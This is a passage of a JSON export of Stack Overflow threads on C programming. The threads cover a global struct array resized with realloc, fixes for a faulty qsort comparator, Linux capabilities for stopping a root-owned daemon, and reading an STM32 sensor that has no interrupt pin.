without passing to the functions. No need to pass the global variables. So the variables won't be on the function's local stack. So the global variable (in your case information) is able to retain the modified value through function calls.</p>\n"}], "owner": {"reputation": 109, "user_id": 7840726, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/1767702923a856604b37ed93e1242d7a?s=128&d=identicon&r=PG&f=1", "display_name": "L2C", "link": "https://stackoverflow.com/users/7840726/l2c"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1069, "favorite_count": 0, "accepted_answer_id": 50029551, "answer_count": 2, "score": -1, "last_activity_date": 1524682926, "creation_date": 1524681660, "last_edit_date": 1524682831, "question_id": 50029265, "link": "https://stackoverflow.com/questions/50029265/c-appending-to-array-of-struct", "title": "C appending to array of struct", "body": "<p>So from my understanding of C, if you want to change something permanently inside a function, you have to pass a pointer as an argument. However, I have this bit of code which appends to an array of structs without any pointers.</p>\n\n<p>in some other file:</p>\n\n<pre><code>extern struct data *information;\n</code></pre>\n\n<p>in another file:</p>\n\n<pre><code>struct data *information \n</code></pre>\n\n<p>in some function:</p>\n\n<pre><code>information = malloc(sizeof(data));\n</code></pre>\n\n<p>finally the function in question:</p>\n\n<pre><code>void function(int total, bool status){\n\n        total++;\n        char input[30];\n\n        printf(\"Please enter some input...\\n&gt;&gt;&gt;\");\n        scanf(\" %[^\\n]s\", input);\n\n        //reallocate memory to fit new element\n        information = realloc(information,sizeof(struct some_struct)*total); \n\n\n        //assign values to struct members\n        strcpy(information[total-1].description,input);\n        information[total-1].amount = total;\n\n\n        return;\n}\n</code></pre>\n\n<p>I tested this function by adding some example and when printing it was there. Is my understanding of this wrong, or is this meant to happen?</p>\n"}, {"tags": ["c", "gcc", "comparator", "qsort"], "comments": [{"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 2, "creation_date": 1524680275, "post_id": 50028900, "comment_id": 87073880, "body": "The innermost <code>if</code> does not have the &quot;default&quot; <code>else</code> case, hence the warning."}, {"owner": {"reputation": 58995, "user_id": 1322972, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/puZFr.png?s=128&g=1", "display_name": "WhozCraig", "link": "https://stackoverflow.com/users/1322972/whozcraig"}, "edited": false, "score": 2, "creation_date": 1524680393, "post_id": 50028900, "comment_id": 87073937, "body": "Unrelated, does it not bother you <i>at all</i>, those compiler warnings you <i>should</i> be getting, screaming that conversion from <code>unsigned long</code> to <code>int</code> potentially loses precision?"}, {"owner": {"reputation": 27, "user_id": 7767354, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2d4d5847e39c86f7b22d4b375e13430f?s=128&d=identicon&r=PG&f=1", "display_name": "Guilherme Fernandes", "link": "https://stackoverflow.com/users/7767354/guilherme-fernandes"}, "edited": false, "score": 0, "creation_date": 1524680466, "post_id": 50028900, "comment_id": 87073985, "body": "Hi, thanks for the response. I&#39;ve removed the innermost if&#39;s else, but qsort still doesn&#39;t sort correctly."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 2, "creation_date": 1524680515, "post_id": 50028900, "comment_id": 87074010, "body": "Please show how <code>qsort</code> is called with a <a href=\"http://stackoverflow.com/help/mcve\">Minimal, Complete, and Verifiable example</a>."}, {"owner": {"reputation": 27, "user_id": 7767354, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2d4d5847e39c86f7b22d4b375e13430f?s=128&d=identicon&r=PG&f=1", "display_name": "Guilherme Fernandes", "link": "https://stackoverflow.com/users/7767354/guilherme-fernandes"}, "edited": false, "score": 0, "creation_date": 1524680589, "post_id": 50028900, "comment_id": 87074049, "body": "the compiler didn&#39;t warn me about those (-Wall -ansi) but I&#39;ve fixed it and qsort still doesn&#39;t sort correctly."}, {"owner": {"reputation": 58995, "user_id": 1322972, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/puZFr.png?s=128&g=1", "display_name": "WhozCraig", "link": "https://stackoverflow.com/users/1322972/whozcraig"}, "edited": false, "score": 0, "creation_date": 1524680808, "post_id": 50028900, "comment_id": 87074166, "body": "Maybe I missed something, but all you&#39;re trying to do is order dominant on l1,l2, and if equal, on c1,c2, right? <a href=\"https://pastebin.com/gmvNrPzk\" rel=\"nofollow noreferrer\">Why not just do this?</a>. Note, it could be even shorter with more ternary operations, but it&#39;s probably clearer as-is."}, {"owner": {"reputation": 7824, "user_id": 3899431, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/UeEzu.jpg?s=128&g=1", "display_name": "Luis Colorado", "link": "https://stackoverflow.com/users/3899431/luis-colorado"}, "edited": false, "score": 1, "creation_date": 1524766186, "post_id": 50028900, "comment_id": 87115044, "body": "You&#39;ll get the idea of why people recommends you to post a Minimal, Complete, and Verifiable example from this post.  You act as if you were defending your case in court.  You talk about the probes, but you don&#39;t show them at all. You say that <code>index</code> is assigned the correct value.  I don&#39;t know at this moment if you have assigned, initialised or <code>#define</code>d it, and how, but you&#39;re right... continue as so, and you&#39;ll get desperate, because you tell all us the absolute truth about your code... and don&#39;t tell nothing about the mistake.  You don&#39;t see it. And so we don&#39;t."}], "answers": [{"comments": [{"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1524687718, "post_id": 50029123, "comment_id": 87077481, "body": "A <code>helper</code> function seems OTT. Function <code>lcomparator</code> should be as efficient as possible. Perhaps <code>inline</code> it?"}, {"owner": {"reputation": 196207, "user_id": 434551, "user_type": "registered", "accept_rate": 81, "profile_image": "https://i.stack.imgur.com/8Wzl8.png?s=128&g=1", "display_name": "R Sahu", "link": "https://stackoverflow.com/users/434551/r-sahu"}, "reply_to_user": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1524687935, "post_id": 50029123, "comment_id": 87077579, "body": "@WeatherVane, Won&#39;t that be an attempt at premature optimization? One could use the <code>(l2&lt;l1) - (l1&lt;l2)</code> idea if that turned out to be performance bottleneck."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1524688287, "post_id": 50029123, "comment_id": 87077754, "body": "I am sorry, but your first attempt to answer - challenged by 2 valid (and now deleted) comments has not got much better. This is a poor answer from such a high-rep. Downvote. The answer I upvoted actually spotted the bug."}, {"owner": {"reputation": 196207, "user_id": 434551, "user_type": "registered", "accept_rate": 81, "profile_image": "https://i.stack.imgur.com/8Wzl8.png?s=128&g=1", "display_name": "R Sahu", "link": "https://stackoverflow.com/users/434551/r-sahu"}, "reply_to_user": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1524688583, "post_id": 50029123, "comment_id": 87077902, "body": "@WeatherVane, I respect your opinion."}], "tags": [], "owner": {"reputation": 196207, "user_id": 434551, "user_type": "registered", "accept_rate": 81, "profile_image": "https://i.stack.imgur.com/8Wzl8.png?s=128&g=1", "display_name": "R Sahu", "link": "https://stackoverflow.com/users/434551/r-sahu"}, "is_accepted": false, "score": 2, "last_activity_date": 1524686464, "last_edit_date": 1524686464, "creation_date": 1524681111, "answer_id": 50029123, "question_id": 50028900, "link": "https://stackoverflow.com/questions/50028900/qsort-comparator-function-doesnt-order-the-entire-array-leaves-1-element-out/50029123#50029123", "title": "qsort comparator function doesn&#39;t order the entire array (leaves 1 element out)", "body": "<p>My suggestion:</p>\n\n<ol>\n<li><p>Change the types of the function local variables to <code>unsigned long</code>. You are losing precision when they are of type <code>int</code>. That might be the source of the problem you are seeing but it's hard telling without actual values.</p></li>\n<li><p>The core logic can be made simpler by using a helper function.</p></li>\n</ol>\n\n<p>Here's an updated version of your function.</p>\n\n<pre><code>int compare_helper(unsigned long l1, unsigned long l2)\n{\n   if ( l1 &lt; l2 )\n   {\n      return -1;\n   }\n   if ( l2 &lt; l1 )\n   {\n      return 1;\n   }\n   return 0;\n\n   // The line below does the same thing but relies on the logical expressions \n   // to be 1 or 0.\n   // return (l2&lt;l1) - (l1&lt;l2);\n}\n\nint lcomparator(const void *el1, const void *el2) {\n    unsigned long l1 = ((elemento *)el1)-&gt;linha;\n    unsigned long l2 = ((elemento *)el2)-&gt;linha;\n    unsigned long c1 = ((elemento *)el1)-&gt;coluna;\n    unsigned long c2 = ((elemento *)el2)-&gt;coluna;\n\n    if ( l1 != l2 )\n    {\n       return compare_helper(l1, l2);\n    }\n\n    return compare_helper(c1, c2);\n}\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 1, "creation_date": 1524682476, "post_id": 50029221, "comment_id": 87075013, "body": "Good catch on the comparison."}, {"owner": {"reputation": 12992, "user_id": 2170527, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/64f36e49ac8529003cf57c003746388b?s=128&d=identicon&r=PG", "display_name": "yugr", "link": "https://stackoverflow.com/users/2170527/yugr"}, "edited": false, "score": 0, "creation_date": 1524723628, "post_id": 50029221, "comment_id": 87088031, "body": "Take a look at automated way to identify the issue in my answer."}], "tags": [], "owner": {"reputation": 16936, "user_id": 7076153, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/erPUC.png?s=128&g=1", "display_name": "Stargateur", "link": "https://stackoverflow.com/users/7076153/stargateur"}, "is_accepted": false, "score": 6, "last_activity_date": 1524681487, "creation_date": 1524681487, "answer_id": 50029221, "question_id": 50028900, "link": "https://stackoverflow.com/questions/50028900/qsort-comparator-function-doesnt-order-the-entire-array-leaves-1-element-out/50029221#50029221", "title": "qsort comparator function doesn&#39;t order the entire array (leaves 1 element out)", "body": "<pre><code>else if (c2 &gt; c1) {\n    return 1;\n}\n</code></pre>\n\n<p>is wrong and should be </p>\n\n<pre><code>else if (c1 &gt; c2) {\n    return 1;\n}\n</code></pre>\n\n<p>or better</p>\n\n<pre><code>else {\n    return 1;\n}\n</code></pre>\n\n<p>and of course replace <code>int</code> by <code>unsigned long</code></p>\n"}, {"tags": [], "owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "is_accepted": false, "score": 1, "last_activity_date": 1524691348, "creation_date": 1524691348, "answer_id": 50031555, "question_id": 50028900, "link": "https://stackoverflow.com/questions/50028900/qsort-comparator-function-doesnt-order-the-entire-array-leaves-1-element-out/50031555#50031555", "title": "qsort comparator function doesn&#39;t order the entire array (leaves 1 element out)", "body": "<p>Previous comments and answers have already shown the type difference between <code>unsigned long</code> and <code>int</code>, and the comparison bug. Your code may <em>in practice</em> always return a value but the compiler does not like the hanging <code>else</code>.</p>\n\n<p>I suggest the following:</p>\n\n<pre><code>int lcomparator(const void *el1, const void *el2) {\n    unsigned long l1 = ((elemento *)el1)-&gt;linha;\n    unsigned long l2 = ((elemento *)el2)-&gt;linha;\n    unsigned long c1 = ((elemento *)el1)-&gt;coluna;\n    unsigned long c2 = ((elemento *)el2)-&gt;coluna;\n\n    if(l1 &lt; l2) {\n        return -1;\n    } \n    if(l1 &gt; l2) { \n        return 1;\n    } \n    if(c1 &lt; c2) { \n        return -1;\n    } \n    if(c1 &gt; c2) {\n        return 1;\n    }\n    return 0;\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 12992, "user_id": 2170527, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/64f36e49ac8529003cf57c003746388b?s=128&d=identicon&r=PG", "display_name": "yugr", "link": "https://stackoverflow.com/users/2170527/yugr"}, "is_accepted": false, "score": 1, "last_activity_date": 1524733689, "last_edit_date": 1524733689, "creation_date": 1524723568, "answer_id": 50036037, "question_id": 50028900, "link": "https://stackoverflow.com/questions/50028900/qsort-comparator-function-doesnt-order-the-entire-array-leaves-1-element-out/50036037#50036037", "title": "qsort comparator function doesn&#39;t order the entire array (leaves 1 element out)", "body": "<p>To add to an already correct answer by @Stargateur, here's an automated way to find bug in your code using <a href=\"https://github.com/yugr/sortcheck\" rel=\"nofollow noreferrer\">SortChecker</a>:</p>\n\n<pre><code>LD_PRELOAD=$HOME/SortCheck/bin/libsortcheck.so ./a.out\na.out[3024]: qsort: comparison function is not symmetric (comparison function 0x400526 (/home/yugr/src/so/a.out+0x400526), called from 0x4005c6 (/home/yugr/src/so/a.out+0x4005c6), cmdline is \"./a.out\")\n</code></pre>\n\n<p>This warning says that <code>lcomparator</code> returns inconsistent results when order of arguments is swapped. To further debug this issue, run with</p>\n\n<pre><code>export SORTCHECK_OPTIONS=raise=1\n</code></pre>\n\n<p>and examine generated codedump.</p>\n"}], "owner": {"reputation": 27, "user_id": 7767354, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2d4d5847e39c86f7b22d4b375e13430f?s=128&d=identicon&r=PG&f=1", "display_name": "Guilherme Fernandes", "link": "https://stackoverflow.com/users/7767354/guilherme-fernandes"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 104, "favorite_count": 0, "answer_count": 4, "score": 1, "last_activity_date": 1524733689, "creation_date": 1524680159, "question_id": 50028900, "link": "https://stackoverflow.com/questions/50028900/qsort-comparator-function-doesnt-order-the-entire-array-leaves-1-element-out", "title": "qsort comparator function doesn&#39;t order the entire array (leaves 1 element out)", "body": "<p>Relevant code (index is the size of the array):</p>\n\n<pre><code>typedef struct elemento {\n    unsigned long linha;\n    unsigned long coluna;\n    double valor;\n} elemento; \n\nelemento Representados[MAXN];\nqsort(Representados, index, sizeof(Representados[0]), lcomparator);\n\nint lcomparator(const void *el1, const void *el2) {\n    int l1 = ((elemento *)el1)-&gt;linha;\n    int l2 = ((elemento *)el2)-&gt;linha;\n    int c1 = ((elemento *)el1)-&gt;coluna;\n    int c2 = ((elemento *)el2)-&gt;coluna;\n\n    if (l1 &lt; l2) {\n        return -1;\n    }\n    else if (l1 == l2) {\n        if (c1 &lt; c2) {\n            return -1;\n        }\n        else if (c1 == c2) {\n            return 0;\n        }\n        else if (c2 &gt; c1) {\n            return 1;\n        }\n    }\n    else {\n        return 1;\n    }\n\n}\n</code></pre>\n\n<p>gcc also prints out the 'control reaches end' warning for lcomparator, but I don't see how it would be possible for my function to not return anything.</p>\n"}, {"tags": ["c", "linux"], "comments": [{"owner": {"reputation": 193600, "user_id": 87189, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/98e7d6edce863e7a1bf8199b082eb25e?s=128&d=identicon&r=PG", "display_name": "tadman", "link": "https://stackoverflow.com/users/87189/tadman"}, "edited": false, "score": 1, "creation_date": 1524683036, "post_id": 50028890, "comment_id": 87075351, "body": "You could use <code>sudo</code> and set up a rule for that process."}, {"owner": {"reputation": 1854, "user_id": 224935, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/59h0o.jpg?s=128&g=1", "display_name": "Jay Elston", "link": "https://stackoverflow.com/users/224935/jay-elston"}, "edited": false, "score": 0, "creation_date": 1524683840, "post_id": 50028890, "comment_id": 87075742, "body": "Can you add an example of what you are doing right now?"}, {"owner": {"reputation": 1, "user_id": 2739695, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4ecbf1a4afad541990fa0fe2a2249220?s=128&d=identicon&r=PG&f=1", "display_name": "wjow", "link": "https://stackoverflow.com/users/2739695/wjow"}, "edited": false, "score": 0, "creation_date": 1524985031, "post_id": 50028890, "comment_id": 87183950, "body": "I have to limit capabilities to the  required set i.e. unprivileged process could only kill privileged process."}], "answers": [{"comments": [{"owner": {"reputation": 1, "user_id": 2739695, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4ecbf1a4afad541990fa0fe2a2249220?s=128&d=identicon&r=PG&f=1", "display_name": "wjow", "link": "https://stackoverflow.com/users/2739695/wjow"}, "edited": false, "score": 0, "creation_date": 1524985403, "post_id": 50059419, "comment_id": 87184021, "body": "I was thinking about using capabilities utility. Unprivileged process would have to pass CAP_KILL through execl to bash. This way bash would be partially privileged and  could kill the privileged process."}], "tags": [], "owner": {"reputation": 119882, "user_id": 3545273, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/RDWxl.png?s=128&g=1", "display_name": "Serge Ballesta", "link": "https://stackoverflow.com/users/3545273/serge-ballesta"}, "is_accepted": false, "score": 0, "last_activity_date": 1524821528, "creation_date": 1524821528, "answer_id": 50059419, "question_id": 50028890, "link": "https://stackoverflow.com/questions/50028890/capabilities-to-run-start-stop-daemon/50059419#50059419", "title": "Capabilities to run start-stop-daemon", "body": "<p>I will rewrite your question as <em>how is it possible to trigger an administrative task (requiring root priviledges) from a user lever process?</em></p>\n\n<p>The common way if to set a priviledged relay that will accept to be activated from a non priviledged task. There are two classical ways to do that in Unix/Linux world:</p>\n\n<ol>\n<li>legacy way: an executale owned by root with the seuid bit set and executable only by a group of users allowed to execute the priviledged task. But setuid executables come with a high risk because any bug can lead to serious consequences. The well know <code>sudo</code> is just an example of such a <em>root seutid</em> executable but it has been extensively tested</li>\n<li>the daemon way: a priviledged daemon waits for some <em>event</em> and executes the priviledged task. The interface with the unpriviledged world is only the <em>event</em>, so the risk is commonly seen as lower. The event is commonly the presence of a file in a directory, or a message written in a fifo file, or a network packet.</li>\n</ol>\n\n<p>In either way, you must considere the security question: how to ensure only legitimate triggering of the priviledged task.</p>\n"}], "owner": {"reputation": 1, "user_id": 2739695, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4ecbf1a4afad541990fa0fe2a2249220?s=128&d=identicon&r=PG&f=1", "display_name": "wjow", "link": "https://stackoverflow.com/users/2739695/wjow"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 598, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1524821528, "creation_date": 1524680134, "last_edit_date": 1524817444, "question_id": 50028890, "link": "https://stackoverflow.com/questions/50028890/capabilities-to-run-start-stop-daemon", "title": "Capabilities to run start-stop-daemon", "body": "<p>I would like to stop process (proc2) which was started by root\nby my unprivileged process (proc1).</p>\n\n<p>My process proc1 calls <em>execl(\"/bin/sh\",\"sh\",\"-c\",\"/etc/init.d/proc2 restart\",nullptr).</em></p>\n\n<p>and <em>/etc/init.d/proc2 restart</em> calls <em>start-stop-daemon</em></p>\n\n<p>which fails because of lack of capabilities to kill proc2 (suid root)</p>\n\n<p>What kind of capabilities have to be set to unprivileged process proc1 in order it could run start-stop-daemon (kill proc2)?</p>\n"}, {"tags": ["c", "interrupt", "stm32", "multitasking", "pressure"], "comments": [{"owner": {"reputation": 33488, "user_id": 6110094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/wozpD.png?s=128&g=1", "display_name": "0___________", "link": "https://stackoverflow.com/users/6110094/0"}, "edited": false, "score": 0, "creation_date": 1524688856, "post_id": 50028821, "comment_id": 87078025, "body": "i2c or spi? If i2c it will acknowledge if ready.  In the SPI mode it changes the state of SDO line when the conversion is ready. You do not have to guess."}, {"owner": {"reputation": 392, "user_id": 3245247, "user_type": "registered", "accept_rate": 36, "profile_image": "https://i.stack.imgur.com/EPh8M.png?s=128&g=1", "display_name": "Alexis", "link": "https://stackoverflow.com/users/3245247/alexis"}, "reply_to_user": {"reputation": 33488, "user_id": 6110094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/wozpD.png?s=128&g=1", "display_name": "0___________", "link": "https://stackoverflow.com/users/6110094/0"}, "edited": false, "score": 0, "creation_date": 1524692631, "post_id": 50028821, "comment_id": 87079658, "body": "Hi, thank you for your reply. I&#39;m using I2C. Concerning the acknowledge you talk about: I&#39;m not sure to have understood. Could you explain more? Thank you very much."}, {"owner": {"reputation": 33488, "user_id": 6110094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/wozpD.png?s=128&g=1", "display_name": "0___________", "link": "https://stackoverflow.com/users/6110094/0"}, "edited": false, "score": 0, "creation_date": 1524694222, "post_id": 50028821, "comment_id": 87080164, "body": "All is in the DS."}, {"owner": {"reputation": 11050, "user_id": 4561887, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/1ecb6a74fca21551bd8157504ad47faf?s=128&d=identicon&r=PG&f=1", "display_name": "Gabriel Staples", "link": "https://stackoverflow.com/users/4561887/gabriel-staples"}, "edited": false, "score": 0, "creation_date": 1524698670, "post_id": 50028821, "comment_id": 87081425, "body": "Datasheet link appears to be dead or I&#39;d try to help...nevermind...was just suuuuuper slow to load for some reason."}, {"owner": {"reputation": 11050, "user_id": 4561887, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/1ecb6a74fca21551bd8157504ad47faf?s=128&d=identicon&r=PG&f=1", "display_name": "Gabriel Staples", "link": "https://stackoverflow.com/users/4561887/gabriel-staples"}, "reply_to_user": {"reputation": 33488, "user_id": 6110094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/wozpD.png?s=128&g=1", "display_name": "0___________", "link": "https://stackoverflow.com/users/6110094/0"}, "edited": false, "score": 1, "creation_date": 1524848968, "post_id": 50028821, "comment_id": 87150854, "body": "Alek, I&#39;ve read the entire datasheet, and no, it&#39;s not exactly &quot;all in the DS&quot; as @PeterJ_01 says. There are some questions left unanswered, such as &quot;what happens in SPI communication [see p10-11] if you pull CSB HIGH during ADC conversion so you can communicate with other SPI devices during that long wait time...will SDO still go HIGH at the end of the conversion?&quot; My hunch is no, it will not, because if CSB is HIGH the sensor doesn&#39;t have permission to write to the SPI bus. This means that if you are OK blocking the SPI bus you can wait for SDO to go HIGH..."}, {"owner": {"reputation": 11050, "user_id": 4561887, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/1ecb6a74fca21551bd8157504ad47faf?s=128&d=identicon&r=PG&f=1", "display_name": "Gabriel Staples", "link": "https://stackoverflow.com/users/4561887/gabriel-staples"}, "edited": false, "score": 1, "creation_date": 1524849038, "post_id": 50028821, "comment_id": 87150884, "body": "...(and interrupt on that) before sending the ADC Read command, but if you want to do other SPI commands to other devices during that long conversion time (9ms is very long) you need to do something like my answer below implements. Otherwise, if you accidentally send the ADC Read command too soon, per the datasheet (p11), &quot;If the ADC read command is sent during conversion the result will be 0, the conversion will not stop and the final result will be wrong.&quot; So, don&#39;t make that mistake."}], "answers": [{"comments": [{"owner": {"reputation": 33488, "user_id": 6110094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/wozpD.png?s=128&g=1", "display_name": "0___________", "link": "https://stackoverflow.com/users/6110094/0"}, "edited": false, "score": 0, "creation_date": 1524737725, "post_id": 50032992, "comment_id": 87096786, "body": "Ufff,,,, Isn&#39;t easier to use the I2C interrupt to have the acknowledge of the data ready or in the SPI mode after the command sent set the SDO connected pin as digital input and wait for the EXTI interrupt instead of this spaghetti method. Loooong answer but the worst method chosen. Waste of timers, over complicated method - generally a very bad answer - a spaghetti style method."}, {"owner": {"reputation": 11050, "user_id": 4561887, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/1ecb6a74fca21551bd8157504ad47faf?s=128&d=identicon&r=PG&f=1", "display_name": "Gabriel Staples", "link": "https://stackoverflow.com/users/4561887/gabriel-staples"}, "reply_to_user": {"reputation": 33488, "user_id": 6110094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/wozpD.png?s=128&g=1", "display_name": "0___________", "link": "https://stackoverflow.com/users/6110094/0"}, "edited": false, "score": 1, "creation_date": 1524849571, "post_id": 50032992, "comment_id": 87151119, "body": "You are making some pretty big assumptions here that, according to my study, don&#39;t seem correct. I&#39;ve read the entire datasheet and studied this really good article on I2C (<a href=\"https://learn.sparkfun.com/tutorials/i2c\" rel=\"nofollow noreferrer\">learn.sparkfun.com/tutorials/i2c</a>), and you are under the assumption that the slave is doing &quot;Clock stretching&quot; (see article) and not sending the ACK bit after the ADC Read command until data is actually ready. Not only does the datasheet seem to indicate to the contrary (though it isn&#39;t crystal clear), this would unnecessarily tie up the entire I2C bus during a conversion, which is wasteful and blocks other devices."}, {"owner": {"reputation": 11050, "user_id": 4561887, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/1ecb6a74fca21551bd8157504ad47faf?s=128&d=identicon&r=PG&f=1", "display_name": "Gabriel Staples", "link": "https://stackoverflow.com/users/4561887/gabriel-staples"}, "reply_to_user": {"reputation": 33488, "user_id": 6110094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/wozpD.png?s=128&g=1", "display_name": "0___________", "link": "https://stackoverflow.com/users/6110094/0"}, "edited": false, "score": 0, "creation_date": 1524849736, "post_id": 50032992, "comment_id": 87151192, "body": "As for the SPI thing and the SDO line going high after conversion, see my comments under the question at the top of this page: #1) the datasheet isn&#39;t clear on this, #2) if this is the case for how it operates when you hold the chip select pin (CSB) LOW during the entire conversion...well...you just blocked other SPI communication during the entire conversion. Sometimes you can&#39;t afford to do this, as blocking for 10ms is a long time if you have many SPI devices on the bus."}, {"owner": {"reputation": 11050, "user_id": 4561887, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/1ecb6a74fca21551bd8157504ad47faf?s=128&d=identicon&r=PG&f=1", "display_name": "Gabriel Staples", "link": "https://stackoverflow.com/users/4561887/gabriel-staples"}, "reply_to_user": {"reputation": 33488, "user_id": 6110094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/wozpD.png?s=128&g=1", "display_name": "0___________", "link": "https://stackoverflow.com/users/6110094/0"}, "edited": false, "score": 1, "creation_date": 1524849927, "post_id": 50032992, "comment_id": 87151265, "body": "So, my method works, is fairly simple and straight forward, allows effective cooperative multitasking while only taking a <i>portion</i> of a <i>single</i> timer to operate an infinite number of tasks, and in my opinion is very good code. If you have a better way of doing things, please teach us. I&#39;d like to see your 30 yrs experience (as stated in your profile, with the last 5-10 years of that being &quot;mostly focused on the bare metal embedded programming&quot;) in action in an answer you write here as thorough and well-thought-out as mine. Honestly, if you have a better way I&#39;d like to learn it."}, {"owner": {"reputation": 33488, "user_id": 6110094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/wozpD.png?s=128&g=1", "display_name": "0___________", "link": "https://stackoverflow.com/users/6110094/0"}, "edited": false, "score": 0, "creation_date": 1524855187, "post_id": 50032992, "comment_id": 87153629, "body": "Arduino style (which is very similar to the thee starts programming) - and unfortunately it is a very very bad approach in the uC programming. Modesty literally flows from your comments. And BTW it does not have anything in common with multitasking. It  should be called. Arduino loop for stm32. And as I see you took all the bad from the arduino."}, {"owner": {"reputation": 11050, "user_id": 4561887, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/1ecb6a74fca21551bd8157504ad47faf?s=128&d=identicon&r=PG&f=1", "display_name": "Gabriel Staples", "link": "https://stackoverflow.com/users/4561887/gabriel-staples"}, "reply_to_user": {"reputation": 33488, "user_id": 6110094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/wozpD.png?s=128&g=1", "display_name": "0___________", "link": "https://stackoverflow.com/users/6110094/0"}, "edited": false, "score": 1, "creation_date": 1524860467, "post_id": 50032992, "comment_id": 87155971, "body": "Let me re-emphasize the most important thing I said: <b><i>if you have something to teach, please share it in an answer.</i></b> Thank you. Also, please don&#39;t read my comments with any tone of sarcasm. That&#39;s not how they are intended. Interpret them at face-value."}, {"owner": {"reputation": 33488, "user_id": 6110094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/wozpD.png?s=128&g=1", "display_name": "0___________", "link": "https://stackoverflow.com/users/6110094/0"}, "edited": false, "score": 0, "creation_date": 1524864311, "post_id": 50032992, "comment_id": 87157536, "body": "This is not teaching portal. OP can try it yourself and if he has problems can ask the question."}], "tags": [], "owner": {"reputation": 11050, "user_id": 4561887, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/1ecb6a74fca21551bd8157504ad47faf?s=128&d=identicon&r=PG&f=1", "display_name": "Gabriel Staples", "link": "https://stackoverflow.com/users/4561887/gabriel-staples"}, "is_accepted": false, "score": 5, "last_activity_date": 1590622086, "last_edit_date": 1590622086, "creation_date": 1524701487, "answer_id": 50032992, "question_id": 50028821, "link": "https://stackoverflow.com/questions/50028821/best-way-to-read-from-a-sensor-that-doesnt-have-interrupt-pin-and-requires-some/50032992#50032992", "title": "Best way to read from a sensor that doesn&#39;t have interrupt pin and requires some time before the 